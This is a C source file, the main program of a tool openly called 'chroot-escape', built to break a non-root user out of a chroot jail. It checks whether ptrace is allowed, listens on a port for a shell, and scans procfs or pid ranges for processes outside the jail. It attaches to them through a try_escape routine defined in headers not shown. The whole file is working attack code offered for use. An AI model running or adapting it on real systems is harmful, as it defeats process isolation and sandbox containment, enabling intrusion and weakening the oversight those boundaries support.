#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <getopt.h>
#include <string.h>
#include <errno.h>
#include <err.h>


#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

#include "ptrace-check.h"
#include "try-escape.h"
#include "network.h"
#include "proc.h"
#include "common.h"

#define xreturn if(!opts.force) return

struct chroot_opts {
    pid_t range[2];
    int force;
    int all;
    pid_t pid;
    char *proc;
    int scan;
    int port;
};


int injail(void){
    struct stat buf;

    if(stat("/", &buf) == -1){
        return -1;
    }

    return (buf.st_ino != 2);
}

void help(void){
    static const char msg[]=
        "-- chroot-escape --\n"
        "- try escape from chroot with non root user\n\n"

        " Options:\n"
        "  --proc-scan                scan procfs for out of jail pid\n"
        "  --proc STRING              proc mount point (Default: /proc)\n"
        "  -r, --pid-range start-end  use this options if proc are not mounted\n"
        "  -p, --pid NUMBER           try escape attaching specific pid\n"
        "  -P, --port NUMBER          port number to listen (Default: random)\n"
        "  -a, --any                  try attach any pid\n"
        "  -f, --force                ignore everything\n"
        "  -h, --help                 display this help menu";

    puts(msg);
    exit(0);
}

void parser_range(const char *str, pid_t *out){
    char *endptr;

    out[0] = strtol(str, &endptr, 10);
    if(!endptr || *endptr != '-')
        errx(1, "invalid pid range");

    endptr++;
    out[1] = strtol(endptr, NULL, 10);

    if(!out[0] || !out[1] || (out[1] < out[0]))
        errx(1, "invalid pid range");
}

void parser_opts(int argc, char **argv, struct chroot_opts *opts){
    static struct option long_options[] = {
        {"pid-range", required_argument, 0, 'r'},
        {"pid", required_argument, 0, 'p'},
        {"all", no_argument, 0, 'a'},
        {"force", no_argument, 0, 'f'},
        {"help", no_argument, 0, 'h'},
        {"proc", required_argument, 0, 0},
        {"proc-scan", no_argument, 0, 0},
        {"port", required_argument, 0, 'P'},
        {0, 0, 0, 0}
    };

    int optc, option_index = 0;
    memset(opts, 0, sizeof(struct chroot_opts));

    opts->proc = "/proc";

    while(1){
        optc = getopt_long(argc, argv, "r:p:afhP:", long_options, &option_index);
        if(optc == -1)
            break;

        switch(optc){
            case 0:
                if(!strcmp(long_options[option_index].name, "proc-scan"))
                    opts->scan = 1;
                else
                    opts->proc = optarg;
            break;

            case 'r':
                parser_range(optarg, opts->range);
            break;

            case 'p':
                opts->pid = atoi(optarg);
                if(!opts->pid)
                    errx(1, "invalid pid");
            break;

            case 'P':
                opts->port = atoi(optarg);
                if(opts->port > 0 && opts->port > 0xffff)
                    errx(1, "invalid port");
            break;

            case 'a':
                opts->all = 1;
            break;

            case 'f':
                opts->force = 1;
            break;

            case 'h':
                help();
            break;

            default:
                printf("-h, --help for help\n");
                exit(1);
        }
    }
}

int main(int argc, char **argv){
    struct chroot_opts opts;
    struct pidlist plist;
    int i, status, fd, escape = 0;
    pid_t bg = 0;

    parser_opts(argc, argv, &opts);

    setvbuf(stdout, NULL, _IONBF, 0);

    if(!opts.pid && !opts.scan && !opts.range[0]){
        bad("you must set at least one of these options: --proc-scan, -p, -r\n");
        bad("try -h, --help for further information\n");
        return 0;
    }

    if(!(user_id = getuid()) && !opts.force){
        bad("you are r0ot, chdir(\"..\"); ? rerun with -f\n");
        return 0;
    }

    info("user id = %d\n", user_id);
    info("checking chroot jail ...\n");
    status = injail();
    if(status == -1){
        bad("can't stat(\"/\"): %s\n", strerror(errno));
        xreturn 0;
    } else if(status == 0){
        bad("you are not in a chroot jail\n");
        xreturn 0;
    } else {
        good("you are in a jail !!!\n");
    }

    info("checking if ptrace is blocked ...\n");
    if(!ptrace_allowed(opts.proc)){
        bad("ptrace blocked ...\n");
        xreturn 0;
    } else {
        good("ptrace okay !!!\n");
    }

    info("starting listen ...\n");
    fd = start_listen(&(opts.port));
    if(fd == -1){
        bad("can't listen on port %d: %s\n", opts.port, strerror(errno));
        xreturn 0;
    } else {
        good("listen on port: %d\n", opts.port);
        bg = wait_shell(fd);
    }

    if(opts.pid)
        if((escape = try_escape(opts.pid, opts.port)))
            goto end;

    if(opts.range[0]){
        for(i=opts.range[0]; i<=opts.range[1]; i++)
            if((escape = try_escape(i, opts.port)))
                goto end;
    }

    if(opts.scan){
        info("checking procfs ...\n");
        if(procfs(opts.proc)){
            bad("%s is not a valid procfs\n", opts.proc);
            xreturn 0;
        } else {
            good("procfs okay !!!\n");
        }

        info("scanning proc for pids ...\n");
        listproc(&plist, opts.proc, opts.all);
        if(plist.len)
            good("%d pid(s) to check\n", plist.len);
        else
            bad("scan returns nothing\n");

        for(i=0; i<plist.len; i++){
            if((escape = try_escape(plist.pids[i], opts.port)))
                goto end;
        }
    }

    end:
    if(escape)
        wait(NULL);
    else if(!escape && bg)
        kill(bg, SIGKILL);

    return 0;
}
